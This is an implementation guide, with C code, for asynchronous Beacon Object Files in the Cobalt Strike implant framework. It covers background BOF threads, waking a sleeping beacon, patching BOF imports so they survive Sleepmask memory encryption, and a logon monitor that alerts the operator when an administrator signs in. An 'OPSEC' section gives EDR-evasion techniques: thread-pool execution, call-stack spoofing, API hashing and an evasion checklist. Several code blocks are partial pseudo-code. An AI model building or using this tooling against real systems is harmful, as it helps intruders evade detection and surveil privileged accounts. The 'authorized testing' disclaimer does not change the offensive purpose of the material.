# Async BOF Implementation Guide

## Overview

This document describes the implementation of **Asynchronous Beacon Object Files (BOFs)** for Cobalt Strike, inspired by Outflank's research. The implementation allows BOFs to run in background threads without blocking the main beacon, enabling:

- **Non-blocking execution**: Main beacon can sleep while BOFs run
- **Immediate alerts**: BOFs can wake beacon on critical events
- **Graceful shutdown**: Clean termination via `BeaconGetStopJobEvent()`
- **Sleepmask compatibility**: BOFs work even when beacon memory is encrypted

---

## Architecture Overview

```
┌─────────────────────────────────────────────────────────┐
│                    C2 Server                             │
└─────────────────────────────────────────────────────────┘
                          ↕ (C2 Protocol)
┌─────────────────────────────────────────────────────────┐
│              Main Beacon Thread                          │
│  - Executes commands                                     │
│  - Handles Sleep/Encrypted mode                          │
│  - Processes async output                                │
└──────────────┬──────────────────────────────────────────┘
               │
               │ AsyncBOF_StartJob()
               │
       ┌───────▼──────────────────────────────┐
       │   Async BOF Manager                   │
       │  - Job tracking                       │
       │  - Output buffering                   │
       │  - Event coordination                │
       └───────┬──────────────────────────────┘
               │
               ├─────────────────────────────────────┐
               │                                     │
       ┌───────▼────────┐                   ┌──────▼──────┐
       │  Background    │                   │ Background  │
       │  BOF Thread 1  │                   │ BOF Thread 2│
       │                │                   │             │
       │ - Monitoring   │                   │ - Scanner   │
       │ - Long tasks   │                   │ - etc.      │
       └───────┬────────┘                   └──────┬──────┘
               │                                  │
               │ BeaconPrintf() (proxied)         │
               ▼                                  ▼
       ┌──────────────────────────────────────────┐
       │      Async-Safe Function Table           │
       │  - AsyncBOF_ProxyBeaconPrintf()          │
       │  - AsyncBOF_ProxyBeaconOutput()          │
       │  - AsyncBOF_BeaconWakeup()               │
       └──────────────────────────────────────────┘
```

---

## Phase 2: Core API Implementation

### 1. BeaconWakeup() - Waking the Sleeping Beacon

**Purpose**: Allow background BOFs to wake the main beacon immediately when critical events occur.

**Implementation**:

```c
// In async_bof_implant.c

BOOL AsyncBOF_BeaconWakeup(void)
{
    if (g_AsyncBOFManager.hGlobalWakeup == NULL) {
        return FALSE;
    }

    // Check if beacon is sleeping (optimization)
    if (!g_AsyncBOFManager.bBeaconSleeping) {
        // Beacon is already awake
        return TRUE;
    }

    // Signal the wakeup event
    if (!SetEvent(g_AsyncBOFManager.hGlobalWakeup)) {
        return FALSE;
    }

    return TRUE;
}
```

**Usage in Beacon Main Loop**:

```c
// Replace standard Sleep() with async-aware wait
DWORD dwSleepTime = 60000; // 60 seconds

DWORD dwResult = AsyncBOF_WaitForWakeup(dwSleepTime);

if (dwResult == WAIT_OBJECT_0) {
    // Woken up by async BOF!
    AsyncBOF_ProcessAllOutput();
    // Check for alerts, trigger automated responses, etc.
}
```

**Usage in Async BOF**:

```c
// In your BOF code
if (IsAdminLogonEvent()) {
    BeaconPrintf(0, "[ALERT] Admin detected!");

    // Wake beacon immediately
    BeaconWakeup();

    // Beacon will wake from sleep and process output
}
```

**Key Points**:
- Uses Windows Event object (manual-reset)
- Beacon calls `AsyncBOF_WaitForWakeup()` instead of `Sleep()`
- Async BOF calls `BeaconWakeup()` to signal critical events
- Beacon resets event after waking to allow next wait

---

### 2. BeaconGetStopJobEvent() - Graceful Shutdown

**Purpose**: Provide a mechanism for the beacon to request async BOFs to stop cleanly.

**Implementation**:

```c
HANDLE AsyncBOF_GetStopJobEvent(DWORD dwJobId)
{
    // Find the job and return its stop event handle
    for (DWORD i = 0; i < MAX_ASYNC_JOBS; i++) {
        if (g_AsyncBOFManager.Jobs[i].dwJobId == dwJobId) {
            return g_AsyncBOFManager.Jobs[i].hStopEvent;
        }
    }
    return NULL;
}
```

**Usage in Async BOF**:

```c
void MonitorLogonEvents(void)
{
    HANDLE hStop = BeaconGetStopJobEvent();

    while (TRUE) {
        // Check stop signal every second
        DWORD dwResult = WaitForSingleObject(hStop, 1000);

        if (dwResult == WAIT_OBJECT_0) {
            // Stop requested!
            BeaconPrintf(0, "[BOF] Shutting down gracefully...\n");
            CleanupResources();
            break;
        }

        // Do monitoring work
        CheckForLogonEvents();
    }
}
```

**Key Points**:
- Each job gets a dedicated stop event
- BOF should poll this event periodically
- NEVER use `TerminateThread()` - always use graceful shutdown
- Cleanup resources before returning

---

### 3. Function Table & IAT Patching (Sleepmask Compatibility)

**Problem**: When the main beacon encrypts its memory with Sleepmask, async BOFs cannot call `BeaconPrintf()` or other Beacon APIs directly - it will crash!

**Solution**: Patch the BOF's import table to use async-safe proxy functions.

**Implementation Steps**:

#### Step 1: Define Proxy Functions

```c
// Async-safe version of BeaconPrintf
void AsyncBOF_ProxyBeaconPrintf(int type, const char* fmt, ...)
{
    DWORD dwJobId = GetCurrentJobId();

    // Find job's output buffer
    PASYNC_BOF_JOB pJob = FindJobById(dwJobId);

    // Format message
    char szBuffer[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf_s(szBuffer, sizeof(szBuffer), _TRUNCATE, fmt, args);
    va_end(args);

    // Add to job's output buffer (thread-safe)
    EnterCriticalSection(&pJob->csOutput);
    AppendToOutputBuffer(pJob, type, szBuffer, strlen(szBuffer));
    LeaveCriticalSection(&pJob->csOutput);
}
```

#### Step 2: Patch BOF Imports

```c
BOOL AsyncBOF_PatchImports(LPVOID pBOFEntry, ASYNC_BOF_FUNCTION_TABLE* pTable)
{
    // 1. Parse COFF header
    COFF_FILE_HEADER* pHeader = ParseCOFF(pBOFEntry);

    // 2. Find Beacon API symbols in symbol table
    for (each symbol in pHeader) {
        if (symbol.name == "BeaconPrintf") {
            // 3. Find relocation entries for this symbol
            for (each relocation) {
                if (relocation.symbol == BeaconPrintf) {
                    // 4. Patch address to use proxy function
                    PatchRelocation(relocation,
                        AsyncBOF_ProxyBeaconPrintf);
                }
            }
        }
    }

    FlushInstructionCache();
    return TRUE;
}
```

#### Step 3: Memory Protection

```c
// Called by beacon RIGHT BEFORE encrypting itself
BOOL AsyncBOF_ProtectMemoryForSleep(void)
{
    // Mark all BOF code regions as READONLY
    for (each BOF job) {
        VirtualProtect(job.pCode, job.nSize,
            PAGE_READONLY, &oldProtect);
    }

    FlushInstructionCache();
}

// Called by beacon RIGHT AFTER decrypting itself
BOOL AsyncBOF_RestoreMemoryAfterSleep(void)
{
    // Restore permissions
    for (each BOF job) {
        VirtualProtect(job.pCode, job.nSize,
            PAGE_EXECUTE_READWRITE, &oldProtect);
    }
}
```

---

## OPSEC Enhancements

### 1. Thread Pool Instead of CreateThread

**Problem**: `CreateThread()` is suspicious and easily detected by EDRs.

**Solution**: Use Windows Thread Pool API.

```c
BOOL AsyncBOF_StartJobWithThreadPool(
    LPTHREAD_START_ROUTINE pBOFEntry,
    LPVOID pContext)
{
    // Create thread pool work object
    PTP_WORK pWork = CreateThreadpoolWork(
        ThreadPoolCallback,
        pContext,
        NULL
    );

    // Submit to thread pool
    SubmitThreadpoolWork(pWork);

    return TRUE;
}
```

**Benefits**:
- Threads appear more legitimate (managed by Windows)
- Better resource management
- Less suspicious to EDRs

---

### 2. Stack Spoofing

**Problem**: EDRs analyze call stacks to detect suspicious threads.

**Solution**: Fake the call stack to appear from legitimate code.

```c
BOOL AsyncBOF_SetupStackSpoofing(void)
{
    // Get return address from legitimate DLL (e.g., ntdll.dll)
    LPVOID pLegitAddr = GetProcAddress(
        GetModuleHandleA("ntdll.dll"),
        "NtDelayExecution"
    );

    // Setup stack frame to appear as if called from ntdll
    // (Implementation is architecture-specific)
    SetupStackFrame(pLegitAddr);

    return TRUE;
}
```

**Benefits**:
- Call stack analysis shows ntdll.dll frames
- Hides beacon/BOF memory addresses
- Evades stack-walking EDRs

---

### 3. API Hashing

**Problem**: Importing suspicious APIs like `CreateEventA` is easily detected.

**Solution**: Resolve functions dynamically by hash.

```c
// Pre-computed hash (offline)
DWORD g_hashCreateEventA = 0x8A31B123; // Example hash

typedef HANDLE (*PFN_CREATEEVENTA)(...);

// Resolve at runtime
PFN_CREATEEVENTA pCreateEventA = (PFN_CREATEEVENTA)
    GetProcAddressByHash("kernel32.dll", g_hashCreateEventA);

// Use function
HANDLE hEvent = pCreateEventA(NULL, TRUE, FALSE, NULL);
```

**Benefits**:
- No suspicious import table
- String-based signatures won't find API names
- Dynamic resolution

---

## Usage Example: Async Logon Monitor

Here's a complete example of an async BOF that monitors for admin logons:

```c
// monitor_logon.c

void bof_main(void* parser, int argc)
{
    HANDLE hStop = BeaconGetStopJobEvent();

    // Subscribe to Security event log
    EVT_HANDLE hSub = EvtSubscribe(NULL, NULL,
        L"Security",
        L"*[System[(EventID=4624)]]",
        NULL, NULL, NULL,
        EvtSubscribeToFutureEvents);

    // Monitor loop
    while (WaitForSingleObject(hStop, 1000) != WAIT_OBJECT_0) {
        EVT_HANDLE hEvent = EvtNextEvent(hSub, 100);

        if (hEvent && IsAdminLogon(hEvent)) {
            wchar_t wsUser[256];
            ExtractUsername(hEvent, wsUser, 256);

            // Alert immediately
            BeaconPrintf(0, "[ALERT] Admin: %ls\n", wsUser);

            // Wake beacon from sleep!
            BeaconWakeup();
        }

        if (hEvent) EvtClose(hEvent);
    }

    EvtClose(hSub);
}
```

**Usage from Beacon**:

```
beacon> async_bof monitor_logon.c
[*] Started async job ID 1
[*] BOF running in background
beacon> sleep 60
[*] Beacon sleeping...
[... 30 seconds later ...]
[*] WOKEN UP by async BOF!
[ALERT] Admin logon detected: CORP\Administrator
```

---

## Implementation Checklist

### For Implant Developers

- [ ] Initialize AsyncBOF manager during beacon startup
- [ ] Replace `Sleep()` with `AsyncBOF_WaitForWakeup()` in main loop
- [ ] Implement output processing in C2 callback
- [ ] Add `async_bof` command to beacon console
- [ ] Test with Sleepmask enabled

### For BOF Developers

- [ ] Include `async_bof.h` header
- [ ] Use `BeaconGetStopJobEvent()` for graceful shutdown
- [ ] Call `BeaconWakeup()` on critical events
- [ ] Poll stop event periodically (every 1-5 seconds)
- [ ] Test with beacon in encrypted mode

### For OPSEC

- [ ] Use thread pool instead of `CreateThread()`
- [ ] Implement stack spoofing
- [ ] Use API hashing for suspicious imports
- [ ] Protect memory regions during Sleepmask
- [ ] Add random delays to avoid patterns
- [ ] Test against target EDRs

---

## Troubleshooting

### Issue: BOF crashes when beacon sleeps

**Cause**: BOF calling Beacon APIs directly while beacon memory is encrypted.

**Solution**: Ensure IAT patching is working. Check that `AsyncBOF_PatchImports()` is called before BOF starts.

### Issue: Beacon never wakes up

**Cause**: Wakeup event not initialized or not being waited on.

**Solution**:
1. Check that `AsyncBOF_InitializeWakeupEvent()` is called at startup
2. Verify beacon main loop uses `AsyncBOF_WaitForWakeup()` not `Sleep()`
3. Check event handle is valid (not NULL)

### Issue: BOF doesn't stop when commanded

**Cause**: BOF not checking stop event frequently enough.

**Solution**: Add more frequent `WaitForSingleObject(hStop, timeout)` calls in BOF loop.

---

## References

- Outflank's Async BOF Research: https://www.outflank.nl/blog/2025/07/16/async-bofs-wake-me-up-before-you-go-go/
- Cobalt Strike BOF Documentation
- Windows Internals (Thread Pool, Events, Memory Management)
- COFF Format Specification

---

## License

This implementation is for educational and authorized security testing purposes only.

---

**Generated for Async BOF Implementation Project**
*Author: Offensive Security Researcher*
*Date: 2025*
